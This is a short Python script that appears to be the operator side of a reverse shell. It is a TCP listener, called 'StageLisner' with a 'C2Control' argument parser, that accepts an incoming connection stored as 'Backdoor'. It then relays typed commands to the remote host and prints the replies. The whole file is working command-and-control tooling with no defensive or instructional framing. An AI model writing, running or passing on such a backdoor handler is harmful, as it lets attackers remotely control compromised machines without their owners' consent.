#!/usr/bin/env python
import socket 
import os
import sys
import base64
import argparse
import time
import Banner

class StageLisner:
    def __init__(self):
        Banner.Banner() 
        self.C2Control()
        self.LisnerData()
    def LisnerData(self):

        CallBackSocket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Server = '0.0.0.0'
        Port= self.args.Port
        CallBackSocket.bind((Server,Port))
        CallBackSocket.listen()
        Backdoor , IPaddres = CallBackSocket.accept()
        Info = str(IPaddres).replace('(','').replace(')','').replace("'",'').split(',')
        print('Connect To IP [ '+f'{Info[0]}'+' ]'+' In Port [ '+f'{Info[1]}'+' ]',end='\n')
       
        while True:  
            try: 
                Backdoor.settimeout(5)
                Data = str(Backdoor.recv(4096).decode('latin-1'))
                print(Data,end='', flush=True)   
                INPutConnamd = input()
                if INPutConnamd == '' :
                    Backdoor.sendall('\n'.encode(('latin-1')))
                else:  
                    Backdoor.sendall(bytes(INPutConnamd.encode(('latin-1'))))
                    Data = str(Backdoor.recv(4096).decode('latin-1'))
                    print(Data,end='', flush=True)
            except TimeoutError : 
               Backdoor.sendall('\n'.encode(('latin-1')))
    def C2Control(self): 
        parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")             
        parser.add_argument("-P","--Port" , action=None ,required=False,help ="url Targst web",type=int) 
        self.args = parser.parse_args()     
        if len(sys.argv)!=1 :
            pass
        else:
            parser.print_help()         
            exit()  
if __name__=='__main__':
        StageLisner()